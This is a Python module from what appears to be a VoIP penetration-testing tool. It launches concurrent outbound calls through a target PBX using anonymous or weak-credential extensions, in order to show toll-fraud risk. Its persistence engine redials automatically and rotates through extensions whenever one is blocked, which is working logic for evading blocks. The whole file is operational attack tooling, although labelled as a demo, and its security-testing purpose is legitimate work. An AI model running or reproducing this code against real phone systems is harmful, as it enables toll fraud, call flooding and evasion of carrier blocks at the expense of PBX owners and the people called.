"""Concurrent multi-call manager for the pentest demo GUI.

Demonstrates toll-fraud risk by launching simultaneous outbound calls from
anonymous-INVITE or weak-credential extensions on a target PBX.

Each call runs in its own daemon thread with an independent threading.Event
for per-call teardown — so hanging up call A does not affect call B.

Events emitted (on the module-level bus):
  multicall.update  — fired on every state transition and heartbeat,
                      carries a full snapshot of the call's current status.
"""
from __future__ import annotations

import threading
import time
import uuid
from dataclasses import dataclass, field

from . import live_call
from .events import bus


@dataclass
class CallStatus:
    call_id: str
    extension: str
    target: str
    pbx_host: str
    pbx_port: int
    username: str | None
    password: str | None
    state: str                         # queued | ringing | active | ended | failed
    started_at: float
    answered_at: float | None = None
    ended_at: float | None = None
    codec: str = ""
    rtp_packets_sent: int = 0
    duration_s: float = 0.0
    hangup_side: str = ""
    status_code: int | None = None
    reason: str = ""
    sip_trace: list[str] = field(default_factory=list)
    evidence: str = ""
    error: str = ""


class CallManager:
    """Thread-safe manager for concurrent live calls."""

    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._calls: dict[str, CallStatus] = {}
        self._stop_events: dict[str, threading.Event] = {}

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _emit(self, call_id: str) -> None:
        """Publish the current call status on the event bus."""
        with self._lock:
            cs = self._calls.get(call_id)
        if not cs:
            return
        bus.emit("multicall.update", {
            "call_id": cs.call_id,
            "extension": cs.extension,
            "target": cs.target,
            "pbx_host": cs.pbx_host,
            "pbx_port": cs.pbx_port,
            "state": cs.state,
            "started_at": cs.started_at,
            "answered_at": cs.answered_at,
            "ended_at": cs.ended_at,
            "codec": cs.codec,
            "rtp_packets_sent": cs.rtp_packets_sent,
            "duration_s": round(cs.duration_s, 1),
            "hangup_side": cs.hangup_side,
            "status_code": cs.status_code,
            "reason": cs.reason,
            # Last 60 lines of SIP trace — enough for a verbose log, not too big
            "sip_trace": cs.sip_trace[-60:],
            "evidence": cs.evidence,
            "error": cs.error,
        })

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def launch(
        self,
        pbx_host: str,
        call_to: str,
        call_from: str,
        audio_payload: dict,
        pbx_port: int = 5060,
        username: str | None = None,
        password: str | None = None,
        hold_seconds: float = 300.0,
        timeout: float = 5.0,
        caller_id_name: str = "Pentest Demo",
        dtmf_sequence: str | None = None,
        record_path: str | None = None,
        traffic_log=None,
    ) -> str:
        """Launch a call in a background thread. Returns the unique call_id."""
        call_id = uuid.uuid4().hex[:8]
        stop_ev = threading.Event()
        cs = CallStatus(
            call_id=call_id,
            extension=call_from,
            target=call_to,
            pbx_host=pbx_host,
            pbx_port=pbx_port,
            username=username,
            password=password,
            state="queued",
            started_at=time.time(),
        )
        with self._lock:
            self._calls[call_id] = cs
            self._stop_events[call_id] = stop_ev
        self._emit(call_id)

        t = threading.Thread(
            target=self._run,
            args=(call_id, audio_payload, hold_seconds, timeout,
                  caller_id_name, dtmf_sequence, record_path,
                  traffic_log, stop_ev),
            daemon=True,
            name=f"multicall-{call_id}",
        )
        t.start()
        return call_id

    def hangup(self, call_id: str) -> bool:
        """Signal a specific call to hang up. Returns True if found."""
        with self._lock:
            ev = self._stop_events.get(call_id)
        if ev:
            ev.set()
            return True
        return False

    def hangup_all(self) -> int:
        """Signal every active call to hang up. Returns the count."""
        with self._lock:
            evs = list(self._stop_events.values())
        for ev in evs:
            ev.set()
        return len(evs)

    def get_all(self) -> list[dict]:
        """Return a snapshot of all call statuses (active + completed)."""
        with self._lock:
            return [
                {
                    "call_id": cs.call_id,
                    "extension": cs.extension,
                    "target": cs.target,
                    "pbx_host": cs.pbx_host,
                    "pbx_port": cs.pbx_port,
                    "state": cs.state,
                    "started_at": cs.started_at,
                    "answered_at": cs.answered_at,
                    "ended_at": cs.ended_at,
                    "codec": cs.codec,
                    "rtp_packets_sent": cs.rtp_packets_sent,
                    "duration_s": round(cs.duration_s, 1),
                    "hangup_side": cs.hangup_side,
                    "status_code": cs.status_code,
                    "reason": cs.reason,
                    "sip_trace": cs.sip_trace[-60:],
                    "evidence": cs.evidence,
                    "error": cs.error,
                }
                for cs in self._calls.values()
            ]

    def clear_ended(self) -> int:
        """Remove ended/failed calls from the registry. Returns count removed."""
        with self._lock:
            to_del = [cid for cid, cs in self._calls.items()
                      if cs.state in ("ended", "failed")]
            for cid in to_del:
                del self._calls[cid]
                self._stop_events.pop(cid, None)
        return len(to_del)

    def active_count(self) -> int:
        with self._lock:
            return sum(1 for cs in self._calls.values()
                       if cs.state in ("queued", "ringing", "active"))

    # ------------------------------------------------------------------
    # Thread worker
    # ------------------------------------------------------------------

    def _run(
        self,
        call_id: str,
        audio_payload: dict,
        hold_seconds: float,
        timeout: float,
        caller_id_name: str,
        dtmf_sequence: str | None,
        record_path: str | None,
        traffic_log,
        stop_ev: threading.Event,
    ) -> None:
        with self._lock:
            cs = self._calls[call_id]
            cs.state = "ringing"
        self._emit(call_id)

        def on_answered(remote_media, effective_hold: float) -> None:
            with self._lock:
                cs = self._calls[call_id]
                cs.state = "active"
                cs.answered_at = time.time()
                cs.codec = remote_media.codec
            self._emit(call_id)

        def on_heartbeat(elapsed_s: float, max_hold_s: float,
                         rtp_pkts: int) -> None:
            with self._lock:
                cs = self._calls[call_id]
                cs.duration_s = elapsed_s
                cs.rtp_packets_sent = rtp_pkts
            self._emit(call_id)

        try:
            result = live_call.place_live_call(
                pbx_host=cs.pbx_host,
                call_to=cs.target,
                call_from=cs.extension,
                audio_payload=audio_payload,
                pbx_port=cs.pbx_port,
                username=cs.username,
                password=cs.password,
                hold_seconds=hold_seconds,
                timeout=timeout,
                caller_id_name=caller_id_name,
                dtmf_sequence=dtmf_sequence,
                record_path=record_path,
                traffic_log=traffic_log,
                on_answered=on_answered,
                on_heartbeat=on_heartbeat,
                stop_event=stop_ev,
            )
        except Exception as exc:
            with self._lock:
                cs = self._calls[call_id]
                cs.state = "failed"
                cs.ended_at = time.time()
                cs.error = str(exc)
            self._emit(call_id)
            self._stop_events.pop(call_id, None)
            return

        with self._lock:
            cs = self._calls[call_id]
            cs.state = "ended" if result.success else "failed"
            cs.ended_at = time.time()
            cs.hangup_side = result.hangup_side
            cs.status_code = result.status_code
            cs.reason = result.reason
            cs.rtp_packets_sent = result.rtp_packets_sent
            cs.sip_trace = result.sip_trace
            cs.evidence = result.evidence
            if result.success and cs.answered_at:
                cs.duration_s = cs.ended_at - cs.answered_at
        self._emit(call_id)
        with self._lock:
            self._stop_events.pop(call_id, None)


# ---------------------------------------------------------------------------
# Module-level singleton — imported by gui/server.py
# ---------------------------------------------------------------------------
call_mgr = CallManager()


class CallPersistenceEngine:
    """Keeps a call alive by auto-redialling when it drops.

    Rotates through a list of extensions so if one is blocked, the next
    is tried. Emits persistence.* events on the bus so the GUI shows live status.
    """

    def __init__(self, call_mgr: CallManager) -> None:
        self._call_mgr = call_mgr
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        self._thread: threading.Thread | None = None

        # Status counters — protected by _lock
        self._current_ext: str = ""
        self._total_calls: int = 0
        self._successful_calls: int = 0
        self._blocked_extensions: list[str] = []
        self._running: bool = False

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def start(
        self,
        extensions: list[dict],
        target: str,
        audio_payload: dict,
        *,
        pbx_host: str,
        pbx_port: int = 5060,
        hold_seconds: float = 30.0,
        redial_delay_s: float = 5.0,
        max_retries_per_ext: int = 3,
        caller_id_name: str = "Pentest Demo",
    ) -> None:
        """Start the background persistence thread.

        Args:
            extensions:         List of dicts with keys:
                                  extension, pbx_host, pbx_port, username, password
            target:             Destination number / URI to call.
            audio_payload:      Passed verbatim to call_mgr.launch().
            pbx_host:           Default PBX host (overridden per-extension if set).
            pbx_port:           Default PBX port (overridden per-extension if set).
            hold_seconds:       How long to hold each call before hanging up.
            redial_delay_s:     Seconds to wait between a completed call and the next dial.
            max_retries_per_ext: Failures before an extension is marked blocked.
            caller_id_name:     Caller-ID name sent in SIP From header.
        """
        if self._thread is not None and self._thread.is_alive():
            return  # already running

        self._stop_event.clear()
        with self._lock:
            self._running = True
            self._current_ext = ""
            self._total_calls = 0
            self._successful_calls = 0
            self._blocked_extensions = []

        self._thread = threading.Thread(
            target=self._run,
            kwargs=dict(
                extensions=extensions,
                target=target,
                audio_payload=audio_payload,
                pbx_host=pbx_host,
                pbx_port=pbx_port,
                hold_seconds=hold_seconds,
                redial_delay_s=redial_delay_s,
                max_retries_per_ext=max_retries_per_ext,
                caller_id_name=caller_id_name,
            ),
            name="call-persistence",
            daemon=True,
        )
        self._thread.start()
        bus.emit("persistence.started", {
            "extensions": [e.get("extension") for e in extensions],
            "target": target,
        })

    def stop(self) -> None:
        """Signal the persistence thread to exit and wait for it."""
        self._stop_event.set()
        if self._thread is not None:
            self._thread.join(timeout=15.0)
            self._thread = None
        with self._lock:
            self._running = False

    def status(self) -> dict:
        """Return a snapshot of the engine's current state."""
        with self._lock:
            return {
                "running": self._running,
                "current_ext": self._current_ext,
                "total_calls": self._total_calls,
                "successful_calls": self._successful_calls,
                "blocked_extensions": list(self._blocked_extensions),
            }

    # ------------------------------------------------------------------
    # Thread worker
    # ------------------------------------------------------------------

    def _run(
        self,
        extensions: list[dict],
        target: str,
        audio_payload: dict,
        pbx_host: str,
        pbx_port: int,
        hold_seconds: float,
        redial_delay_s: float,
        max_retries_per_ext: int,
        caller_id_name: str,
    ) -> None:
        """Rotate through extensions, dialling and redialling until stopped."""
        import itertools

        if not extensions:
            bus.emit("persistence.all_blocked", {"reason": "no extensions provided"})
            with self._lock:
                self._running = False
            return

        # Track consecutive failures per extension
        fail_counts: dict[str, int] = {e.get("extension", ""): 0 for e in extensions}

        for ext_cfg in itertools.cycle(extensions):
            if self._stop_event.is_set():
                break

            ext_name = ext_cfg.get("extension", "")

            # Skip already-blocked extensions
            with self._lock:
                blocked = list(self._blocked_extensions)
            if ext_name in blocked:
                # Check if ALL extensions are now blocked
                all_exts = [e.get("extension", "") for e in extensions]
                if all(e in blocked for e in all_exts):
                    bus.emit("persistence.all_blocked", {
                        "blocked_extensions": blocked,
                    })
                    break
                continue

            # Update current extension in status
            with self._lock:
                self._current_ext = ext_name

            bus.emit("persistence.dialling", {
                "extension": ext_name,
                "target": target,
                "fail_count": fail_counts.get(ext_name, 0),
            })

            # Launch the call
            call_id = self._call_mgr.launch(
                pbx_host=ext_cfg.get("pbx_host", pbx_host),
                call_to=target,
                call_from=ext_name,
                audio_payload=audio_payload,
                pbx_port=ext_cfg.get("pbx_port", pbx_port),
                username=ext_cfg.get("username"),
                password=ext_cfg.get("password"),
                hold_seconds=hold_seconds,
                caller_id_name=caller_id_name,
            )

            with self._lock:
                self._total_calls += 1

            # Poll until the call reaches a terminal state
            call_succeeded = False
            while not self._stop_event.is_set():
                snapshots = self._call_mgr.get_all()
                call_snap = next((c for c in snapshots if c["call_id"] == call_id), None)
                if call_snap and call_snap["state"] in ("ended", "failed"):
                    call_succeeded = call_snap["state"] == "ended"
                    break
                time.sleep(0.5)

            if self._stop_event.is_set():
                self._call_mgr.hangup(call_id)
                break

            if call_succeeded:
                fail_counts[ext_name] = 0
                with self._lock:
                    self._successful_calls += 1

                bus.emit("persistence.call_success", {
                    "extension": ext_name,
                    "target": target,
                    "call_id": call_id,
                    "total_successful": self._successful_calls,
                })

                # Wait before redialling
                self._stop_event.wait(timeout=redial_delay_s)
                if not self._stop_event.is_set():
                    bus.emit("persistence.redial", {
                        "extension": ext_name,
                        "target": target,
                    })
            else:
                fail_counts[ext_name] = fail_counts.get(ext_name, 0) + 1

                if fail_counts[ext_name] >= max_retries_per_ext:
                    with self._lock:
                        if ext_name not in self._blocked_extensions:
                            self._blocked_extensions.append(ext_name)

                    bus.emit("persistence.ext_blocked", {
                        "extension": ext_name,
                        "failures": fail_counts[ext_name],
                        "max_retries": max_retries_per_ext,
                    })

                    # Check if all extensions are now blocked
                    with self._lock:
                        blocked_now = list(self._blocked_extensions)
                    all_exts = [e.get("extension", "") for e in extensions]
                    if all(e in blocked_now for e in all_exts):
                        bus.emit("persistence.all_blocked", {
                            "blocked_extensions": blocked_now,
                        })
                        break

        with self._lock:
            self._running = False
            self._current_ext = ""


# ---------------------------------------------------------------------------
# Persistence-engine singleton — imported alongside call_mgr
# ---------------------------------------------------------------------------
persistence_engine = CallPersistenceEngine(call_mgr)
